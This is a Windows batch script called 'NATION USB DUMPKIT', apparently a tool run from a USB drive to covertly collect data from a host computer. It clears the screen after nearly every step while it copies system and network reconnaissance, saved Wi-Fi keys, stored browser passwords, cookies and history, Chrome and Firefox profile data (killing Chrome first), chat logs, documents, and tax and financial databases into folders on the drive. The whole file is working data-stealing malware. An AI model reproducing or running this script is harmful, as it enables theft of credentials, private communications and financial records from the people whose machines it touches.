echo. off
if exist c:\killswitch.txt goto end 
cls
if not exist .\%computername% mkdir .\%computername% >nul
cls
set infolog=>> .\%computername%\%username%.txt  
cls
echo  NATION USB DUMPKIT >> .\%computername%\%username%.txt 
cls
echo                          by  NATION >> .\%computername%\%username%.txt 
:Sinfo
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----System Information--- >> .\%computername%\%username%.txt 
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo Computer Name is: %computername%   >> .\%computername%\%username%.txt 
cls
echo User Name: %username%  >> .\%computername%\%username%.txt 
cls
echo The date and Time is: %date% %time%   >> .\%computername%\%username%.txt 
cls
echo - >> .\%computername%\%username%.txt 
cls
echo [+]name of the domain controller that validated the current logon session. >> .\%computername%\%username%.txt 
cls
echo %logonserver%  >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+]IP Routing tables and Gateway >> .\%computername%\%username%.txt 
cls
 route print >> .\%computername%\%username%.txt 
cls
echo - >> .\%computername%\%username%.txt 
cls
echo [+] MAC Address >> .\%computername%\%username%.txt 
cls
 getmac >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] Operating System type. >> .\%computername%\%username%.txt 
cls
echo %OS% >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+]Number of Processors Installed. >> .\%computername%\%username%.txt 
cls
echo %NUMBER_OF_PROCESSORS% >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] List of Administrators   >> .\%computername%\%username%.txt 
cls
   net localgroup administrators   >> .\%computername%\%username%.txt 
cls
echo -
cls
echo - >> .\%computername%\%username%.txt 
cls
echo [+] Network adapters   >> .\%computername%\%username%.txt 
cls
   ipconfig /all   >> .\%computername%\%username%.txt 
cls
echo - >> .\%computername%\%username%.txt 
cls
echo [+] Task List    >> .\%computername%\%username%.txt 
cls
   tasklist   >> .\%computername%\%username%.txt 
cls
echo - >> .\%computername%\%username%.txt 
cls
:SRemoteInfo
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo ----Remote information----   >> .\%computername%\%username%.txt 
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo [+] Arp Information   >> .\%computername%\%username%.txt 
cls
   arp -a   >> .\%computername%\%username%.txt 
cls
echo - >> .\%computername%\%username%.txt 
cls
echo [+] Listed Domain Users   >> .\%computername%\%username%.txt 
cls
   net group   >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] Listed Local shares   >> .\%computername%\%username%.txt 
cls
   net share   >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] List of Users   >> .\%computername%\%username%.txt 
cls
   net user   >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] Current Connected Users   >> .\%computername%\%username%.txt 
cls
   net use   >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] Listed Current Shares with ID Tags   >> .\%computername%\%username%.txt 
cls
   net view   >> .\%computername%\%username%.txt 
cls
echo  - >> .\%computername%\%username%.txt 
cls
echo [+] Current Machines Connected   >> .\%computername%\%username%.txt 
cls
   nbtstat -n   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Export Wireless Key-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\WifiKey" mkdir ".\%computername%\WifiKey"
cls
::XP
reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces .\%computername%\wifikey\wifi.reg
cls
::Vista/win7
copy /Y %programdata%\Microsoft\Wlansvc\Profiles\Interfaces .\%computername%\wifikey\ 
cls
if exist ".\%computername%\wifikey\*" echo Completed. >> ".\%computername%\%username%.txt"
cls
if not exist ".\%computername%\wifikey\*" echo Failed. >> ".\%computername%\%username%.txt" && rmdir /Q ".\%computername%\WifiKey"
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Registery Dump on IE Typed URLs-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" >> .\%computername%\%username%.txt 
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Registery Dump on IE AutoComplete-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\AutoComplete" >> .\%computername%\%username%.txt
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Registery Dump on IE Crypted Passwords-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms"   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----IE Cookie Dump-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
if exist ".%computername%\InternetBrowsers\IExplorer\Cookie\*.txt" echo Completed. >> ".\%computername%\%username%.txt" && mkdir ".\%computername%\InternetBrowsers\IExplorer\Cookie"
cls
attrib -R -A -S -H "%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*"
cls
copy /Y "%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.txt" ".\%computername%\InternetBrowsers\IExplorer\Cookie\"
cls
if not exist ".%computername%\InternetBrowsers\IExplorer\Cookie\*.txt" echo Failed. >> ".\%computername%\%username%.txt "
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump IE History index.dat File-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
attrib -r -a -s -h "%userprofile%\appdata\Roaming\Microsoft\Windows\Cookies\index.dat"
cls
copy /Y "%userprofile%\appdata\\Roaming\Microsoft\Windows\Cookies\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index1.dat"
cls
attrib -a -r -s -h "%%userprofile%\appdata%\Roaming\Microsoft\Windows\Cookies\Low\index.dat"
cls
copy /Y "%userprofile%\appdata\\Roaming\Microsoft\Windows\Cookies\Low\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index2.dat"
cls
attrib -r -a -s -h "%userprofile%\appdata\Local\Microsoft\Windows\History\History.IE5\index.dat"
cls
copy /Y "%userprofile%\appdata\Local\Microsoft\Windows\History\History.IE5\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index3.dat"
cls
attrib -r -a -s -h "%userprofile%\appdata\Local\Microsoft\Windows\History\History.IE5\Low\index.dat"
cls
copy /Y "%userprofile%\appdata\Local\Microsoft\Windows\History\History.IE5\Low\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index4.dat"
cls
attrib -r -a -s -h "%userprofile%\appdata\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat"
cls
copy /Y "%userprofile%\appdata\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index7.dat"
cls
attrib -r -a -s -h "appdata\Local\Microsoft\Windows\Temporary Internet Files\Low\Content.IE5\index.dat"
cls
copy /Y "%userprofile%\appdata\Local\Microsoft\Windows\Temporary Internet Files\Low\Content.IE5\index.dat" ".\%computername%\InternetBrowsers\IExplorer\\IEindex\index8.dat"
cls
attrib -r -a -s -h "%userprofile%\appdata\Roaming\Microsoft\Internet Explorer\UserData\index.dat"
cls
copy /Y "%userprofile%\appdata\Roaming\Microsoft\Internet Explorer\UserData\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index9.dat"
cls
attrib -r -a -s -h "%userprofile%\appdata\Roaming\Microsoft\Internet Explorer\UserData\Low\index.dat"
cls
copy /Y "%userprofile%\appdata\Roaming\Microsoft\Internet Explorer\UserData\Low\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index0.dat"
cls
attrib -r -a -s -h "%userprofile%\AppData\Local\Microsoft\Internet Explorer\Recovery\Last Active\index.dat"
cls
copy /Y "%userprofile%\AppData\Local\Microsoft\Internet Explorer\Recovery\Last Active\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index11.dat"
cls
attrib -r -a -s -h "%userprofile%\Cookies\index.dat" 
cls
copy /Y "%userprofile%\Cookies\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index12.dat"
cls
attrib -r -a -s -h %userprofile%\Local Settings\History\History.IE5\index.dat"
cls
copy /Y "%userprofile%\Local Settings\History\History.IE5\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index13.dat"
cls
attrib -r -a -s -h %userprofile%\Local Settings\Temporary Internet Files\Content.IE5\index.dat"
cls
copy /Y "%userprofile%\Local Settings\Temporary Internet Files\Content.IE5\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index14.dat"
cls
attrib -r -a -s -h "%userprofile%\UserData\index.dat"
cls
copy /Y "%userprofile%\UserData\index.dat" ".\%computername%\InternetBrowsers\IExplorer\IEindex\index15.dat"
cls
if exist ".\%computername%\InternetBrowsers\IExplorer\IEindex\*.dat" echo Completed. >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\InternetBrowsers\IExplorer\IEindex\*.dat" echo Failed. >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump Browser Data-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
if exist "%AppData%\Local\Google\Chrome\User Data\Default" mkdir ".\%computername%\InternetBrowsers\Chrome" && echo Chrome Found. >> .\%computer%\%username%.txt
cls
if exist "%appdata%\local\microsoft\windows\history\*"  mkdir ".\%computername%\InternetBrowsers\IExplorer\History"
cls
if exist ".\%computername%\InternetBrowsers\IExplore\History\*" echo Completed. >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\Mozilla\Firefox\*" mkdir ".\%computername%\InternetBrowsers\FireFox" && echo FireFox Found.   >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\Thunderbird\*" mkdir ".\%computername%\InternetBrowsers\Thunderbird" && echo Thunderbird Found.   >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\netscape\NSB\*" mkdir ".\%computername%\InternetBrowsers\NetScape" && echo NetScape Found.   >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\Opera\Opera\*" mkdir ".\%computername%\InternetBrowsers\Opera" && echo Opera Found.  >> .\%computername%\%username%.txt 
cls
if exist "%USERPROFILE%\Favorites\*" mkdir ".\%computername%\InternetBrowsers\IExplorer\Favorits" && echo MS IE Found.   >> .\%computername%\%username%.txt 
cls
attrib -r -a -s -h "%USERPROFILE%\Favorites\*"
cls
copy /Y "%USERPROFILE%\Favorites\*" ".\%computername%\InternetBrowsers\IExplorer"
cls
attrib -r -a -s -h "%APPDATA%\netscape\NSB\Profiles"
cls
FOR /R  "%APPDATA%\netscape\NSB\Profiles" %%i IN (*.db, *.dat, bookmarks.html) DO copy /Y %%i ".\%computername%\InternetBrowsers\netScape" 
cls
attrib -r -a -s -h "%APPDATA%\opera\Opera"
cls
FOR /R  "%APPDATA%\opera\Opera" %%i IN (*.db, *.dat, *.ini) DO copy /Y %%i ".\%computername%\InternetBrowsers\Opera\" 
cls
attrib -r -a -s -h "%APPDATA%\Mozilla\Firefox\Profiles"
cls
FOR /R  "%APPDATA%\Mozilla\Firefox\Profiles" %%i IN (*signons*, default*.txt, *.db, *default*, *.html) DO copy /Y %%i ".\%computername%\InternetBrowsers\FireFox\" 
cls
attrib -r -a -s -h "%APPDATA%\Thunderbird\Profiles\*"
cls
copy /Y "%APPDATA%\Thunderbird\Profiles\*" ".\%computername%\InternetBrowsers\ThunderBird\*"
cls
attrib -r -a -s -h "%appdata%\local\microsoft\windows\history\*"
cls
copy /Y "%appdata%\local\microsoft\windows\history\*" ".\%computername%\InternetBrowsers\IExplorer\History"
cls
::Thanks to meme at HF for finding this
taskkill /F /IM chrome.exe
cls
attrib -r -a -s -h 
cls
copy /Y "%AppData%\Local\Google\Chrome\User Data\Default\*" ".\%computername%\InternetBrowsers\Chrome"
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Registery Dump on Remote Desktop Connections -----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" >> .\%computername%\%username%.txt
cls
reg query "HKCU\Software\Microsoft\Terminal Server Client\Server\UsernameHint" >> .\%computername%\%username%.txt
cls
echo note: If empty, no records exist. >> .\%computername%\%username%.txt
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Registery Dump on Startups-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run   >> .\%computername%\%username%.txt 
cls
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Runonce   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump Last Viewed File from Media Player-----   >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
findstr /c:"media" "%userprofile%\appdata\local\microsoft\media player\lastplayed.wpl" >> .\%computername%\%username%.txt 
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump Recently Opened Files-----   >> .\%computername%\%username%.txt 
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
attrib -H -A -S -R "%AppData%\Microsoft\Windows\Recent/*.*"
cls
attrib -H -A -S -R "%USERPROFILE%\Recent\*.*"
cls
if exist "%AppData%\Microsoft\Windows\Recent/*.*" mkdir ".\%computername%\Recently Opened"
cls
copy /Y "%USERPROFILE%\Recent\*" ".\%computername%\Recently Opened"
cls
copy /Y "%AppData%\Microsoft\Windows\Recent\*" ".\%computername%\Recently Opened"
cls
if exist ".\%computername%\Recently Opened\*.*" echo Completed .  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\Recently Opened\*.*" echo Failed.  >> .\%computername%\%username%.txt && rmdir /Q ".\%computername%\Recently Opened"
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump Documents-----   >> .\%computername%\%username%.txt 
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
MkDir .\%computername%\Files
cls
FOR /R "%USERPROFILE%\My Documents" %%i IN (*.one, *.ttf, *.vsd, *.wpg, *.mof, *.pdf, *.txt, *.doc, *.wpd, *.xls, *.docx, *.ppt, *.pptx, *.csv, *.log ) DO ( copy /Y "%%i" ".\%computername%\Files\" )
cls
FOR /R "%USERPROFILE%\Documents" %%i IN (*.one, *.ttf, *.vsd, *.wpg, *.mof, *.pdf, *.txt, *.doc, *.wpd, *.xls, *.docx, *.ppt, *.pptx, *.csv, *.log ) DO ( copy /Y "%%i" ".\%computername%\Files\" )
cls
FOR /R "%USERPROFILE%\Desktop" %%i IN (*.one, *.ttf, *.vsd, *.wpg, *.mof, *.pdf, *.txt, *.doc, *.wpd, *.xls, *.docx, *.ppt, *.pptx, *.csv, *.log ) DO ( copy /Y "%%i" ".\%computername%\Files\" )
cls
If not Exist ".\%computername%\Files\*.mof" (echo MOF Docs Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo MOF Docs Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.one" (echo Microsoft OneNote Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft OneNote Docs Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.ttf" (echo True Type Fornt Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo True Type Fornt Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.vsd" (echo Microsoft Visio Drawing Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft Visio Drawing Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.wpg" (echo WordPerfect Docs Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo WordPerfect Docs Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.pdf" (echo Adobe Docs Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Adobe Docs Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.txt" (echo Text Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Text Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.doc" (echo Document Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Document Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.wpd" (echo WordPad Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo WordPad Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.rtf" (echo Rich Text File Failed. >> .\%computername%\%username%.txt ) ELSE (echo Rich Text File Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.xls" (echo Microsoft Excel  Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft Excel  Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.xlsx" (echo Microsoft Excel  Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft Excel  Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.docx" (echo Document Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Document Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.ppt" (echo Microsoft PowerPoint Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft PowerPoint Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.pptx" (echo Microsoft PowerPoint Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft PowerPoint Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.mdb" (echo Microsoft Access Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Microsoft Access Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.csv" (echo comma-separated value Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo comma-separated value Files Found. >> .\%computername%\%username%.txt )
cls
If not Exist ".\%computername%\Files\*.log" (echo Log Files Failed. >> .\%computername%\%username%.txt ) ELSE (echo Log Files Found. >> .\%computername%\%username%.txt )
cls
echo -------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
echo -----Dump Chat Logs/Logins-----   >> .\%computername%\%username%.txt 
cls
echo ---------------------------------------------------------------------------------------------- >> .\%computername%\%username%.txt 
cls
set chatlog=.\%computername%\ChatLogs
cls
Mkdir %chatlog% 
cls
if exist "%USERPROFILE%\My Documents\My Received Files\*" mkdir "%chatlog%\MSN" && echo MSN Found.  >> .\%computername%\%username%.txt 
cls
if exist "%USERPROFILE%\Documents\My Received Files\*" mkdir "%chatlog%\MSN" && echo MSN Found.  >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\Skype\*" mkdir "%chatlog%\Skype" && echo Skype Found.   >> .\%computername%\%username%.txt 
cls
if exist "%programfiles%\Trillian\*" mkdir "%chatlog%\Trillian" && echo Trillian Found.  >> .\%computername%\%username%.txt 
cls
if exist "%programfiles%\Yahoo!\Messenger\*" mkdir "%chatlog%\Yahoo*" && echo Yahoo Found.   >> .\%computername%\%username%.txt 
cls
if exist "%programfiles%\Miranda\*" mkdir "%chatlog%\Miranda" && echo Miranda Found.   >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\gaim\*" mkdir "%chatlog%\gaim" && echo Gaim Found.  >> .\%computername%\%username%.txt 
cls
if exist "%USERPROFILE%\My Documents\ICQ Lite\*" mkdir "%chatlog%\ICQ" && echo ICQ Found.   >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\.purple" mkdir "%chatlog%\Pidgin" && echo Pidgin Found.   >> .\%computername%\%username%.txt  
cls
if exist "%APPDATA%\MySpace*\IM\Logs\*" mkdir "%chatlog%\MySpace\" && echo MySpace Found.   >> .\%computername%\%username%.txt  
cls
if exist "%APPDATA%\mIRC\logs\*.*" mkdir "%chatlog%\Mirc\"  && echo  Mirc Found.  >> .\%computername%\%username%.txt 
cls
if exist "%APPDATA%\xfire\*" mkdir "%chatlog%\xFire\" && echo xFire Found. >> .\%computername%\%username%.txt 
cls
if exist "%PROGRAMFILES%\AIM*" mkdir "%chatlog%\AIM\" && echo AIM Found. >> .\%computername%\%username%.txt 
cls
copy /Y "%USERPROFILE%\My Documents\My Received Files\*" "%chatlog%\MSN\*"
cls
copy /Y "%USERPROFILE%\Documents\My Received Files\*" "%chatlog%\MSN\*"  
cls
copy /Y "%USERPROFILE%\My Documents\My AIM Logs\*" "%chatlog%\AIM\*"  
cls
copy /Y "%APPDATA%\JAMS\*" "%chatlog%\AIM\*"  
cls
copy /Y "%APPDATA%\Mirc\logs\*.log" "%chatlog%\Mirc\*"  
cls
copy /Y "%APPDATA%\MySpace*\IM\Logs\*" "%chatlog%\MySpace\*"   
cls
copy /Y "%APPDATA%\Skype\*" "%chatlog%\Skype\*"   
cls
copy /Y "%programfiles%\Trillian\users\default\logs\*.log" "%chatlog%\Trilian\"  
cls
copy /Y "%programfiles%\Yahoo!\Messenger\Profiles\*" "%chatlog%\Yahoo!\"  
cls
copy /Y "%APPDATA%\Miranda\*" "%chatlog%\Miranda\*"  
cls
copy /Y "%APPDATA%\*gaim\*.txt" "%chatlog%\Gaim\"  
cls
copy /Y "%APPDATA%\*gaim\*.xml" "%chatlog%\Gaim\"  
cls
copy /Y "%USERPROFILE%\My Documents\ICQ Lite\*" "%chatlog%\ICQ\*"   
cls
copy /Y "%APPDATA%\.purple\*" "%chatlog%\Pidgin\*"  
cls
copy /Y "%APPDATA%\Xfire\chatlog\*.*" "%Chatlog%\xfire\*.*"  
cls
if not exist ".\%computername%\ChatLogs\*.*" echo Failed. >> .\%computername%\%username%.txt && rmdir ".\%computername%\ChatLogs"
cls
if exist ".\%computername%\ChatLogs" echo Found. >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Perviously MSN logins-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
tree %userprofile%\AppData\Local\Microsoft\Messenger  >> .\%computername%\%username%.txt
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Databases and Financials-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%USERPROFILE%\My Documents" %%i IN (*.dbs, *.sql, *.dbf, *.accdb, *.T20, *.TA*, *.TAX*, *.TLG, *.ptb, *.qbb, *.mbf, *.db, *.qdb, *.qdt, *.qba, *.qba, *.qbb, *.qbm, *.qbw, *.qbx, *.qby, *.adp, *.mdb, *.mny, *.t0*, *.QDB, *.QDT, *.QBA, *.QBB, *.QBM, *.QBW, *.QBX, *.QBY) DO mkdir ".\%computername%\DataBases_and_Financials"
cls
if exist "%USERPROFILE%\Documents" %%i IN (*.dbs, *.sql, *.dbf, *.accdb, *.T20, *.TA*, *.TAX*, *.TLG, *.ptb, *.qbb, *.mbf, *.db, *.qdb, *.qdt, *.qba, *.qba, *.qbb, *.qbm, *.qbw, *.qbx, *.qby, *.adp, *.mdb, *.mny, *.t0*, *.QDB, *.QDT, *.QBA, *.QBB, *.QBM, *.QBW, *.QBX, *.QBY) DO mkdir ".\%computername%\DataBases_and_Financials"
cls
FOR /R  "%USERPROFILE%\Documents" %%i IN (*.dbs, *.sql, *.dbf, *.accdb, *.T20, *.TA*, *.TAX*, *.TLG, *.ptb, *.qbb, *.mbf, *.db, *.qdb, *.qdt, *.qba, *.qba, *.qbb, *.qbm, *.qbw, *.qbx, *.qby, *.adp, *.mdb, *.mny, *.t0*, *.QDB, *.QDT, *.QBA, *.QBB, *.QBM, *.QBW, *.QBX, *.QBY) DO copy /Y %%i ".\%computername%\DataBases_and_Financials"
cls
FOR /R  "%USERPROFILE%\My Documents" %%i IN (*.dbs, *.sql, *.dbf, *.accdb, *.T20, *.TA*, *.TAX*, *.TLG, *.ptb, *.qbb, *.mbf, *.db, *.qdb, *.qdt, *.qba, *.qba, *.qbb, *.qbm, *.qbw, *.qbx, *.qby, *.adp, *.mdb, *.mny, *.t0*, *.QDB, *.QDT, *.QBA, *.QBB, *.QBM, *.QBW, *.QBX, *.QBY) DO copy /Y %%i ".\%computername%\DataBases_and_Financials"
cls
::This sorts the files
cls
If Exist ".\%computername%\DataBases_and_Financials\*.mny" mkdir ".\%computername%\DataBases_and_Financials\MicrosoftMoney" && move /Y ".\%computername%\DataBases_and_Financials\*.mny" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\*.mny"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qdb" mkdir ".\%computername%\DataBases_and_Financials\Quicken" && move /Y ".\%computername%\DataBases_and_Financials\*.qdb" ".\%computername%\DataBases_and_Financials\Quicken\*.qdb"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.dbs" mkdir ".\%computername%\DataBases_and_Financials\MySQL" && move /Y ".\%computername%\DataBases_and_Financials\*.dbs" ".\%computername%\DataBases_and_Financials\MySQL\*.dbs"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.sql" mkdir ".\%computername%\DataBases_and_Financials\MySQL" && move /Y ".\%computername%\DataBases_and_Financials\*.sql" ".\%computername%\DataBases_and_Financials\MySQL\*.sql"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.dbf" mkdir ".\%computername%\DataBases_and_Financials\DataBaseFile" && move /Y ".\%computername%\DataBases_and_Financials\*.dbf" ".\%computername%\DataBases_and_Financials\DataBaseFile\*.dbf"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.accdb" mkdir ".\%computername%\DataBases_and_Financials\MicrosoftAccessDataBase" && move /Y ".\%computername%\DataBases_and_Financials\*.accdb" ".\%computername%\DataBases_and_Financials\MicrosoftAccessDataBase\*.accdb"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.T0*" mkdir ".\%computername%\DataBases_and_Financials\TaxCut" && move /Y ".\%computername%\DataBases_and_Financials\*.T0*" ".\%computername%\DataBases_and_Financials\TaxCut\*.T0"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.T20" mkdir ".\%computername%\DataBases_and_Financials\TaxCut" && move /Y ".\%computername%\DataBases_and_Financials\*.T20" ".\%computername%\DataBases_and_Financials\TaxCut\*.T20"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.TA*" mkdir ".\%computername%\DataBases_and_Financials\TaxACT" && move /Y ".\%computername%\DataBases_and_Financials\*.TA*" ".\%computername%\DataBases_and_Financials\TaxAct\*.TA"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.TAX*" mkdir ".\%computername%\DataBases_and_Financials\TurboTax" && move /Y ".\%computername%\DataBases_and_Financials\*.TAX*" ".\%computername%\DataBases_and_Financials\TurboTax\*.TAX"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.TLG" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.TLG" ".\%computername%\DataBases_and_Financials\QuickBooks\*.TLG"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.ptb" mkdir ".\%computername%\DataBases_and_Financials\PeachTree" && move /Y ".\%computername%\DataBases_and_Financials\*.ptb" ".\%computername%\DataBases_and_Financials\PeachTree\*.ptb"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qbb" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qbb" ".\%computername%\DataBases_and_Financials\QuickBooks\*.qbb"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.mbf" mkdir ".\%computername%\DataBases_and_Financials\MicrosoftMoney" && move /Y ".\%computername%\DataBases_and_Financials\*.mbf" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\*.mbf"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.db" mkdir ".\%computername%\DataBases_and_Financials\DataBaseFile" && move /Y ".\%computername%\DataBases_and_Financials\*.db" ".\%computername%\DataBases_and_Financials\DataBaseFile\*.db"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qdb" mkdir ".\%computername%\DataBases_and_Financials\Quicken" && move /Y ".\%computername%\DataBases_and_Financials\*.qdb" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\Quicken\*.qdb"
cls
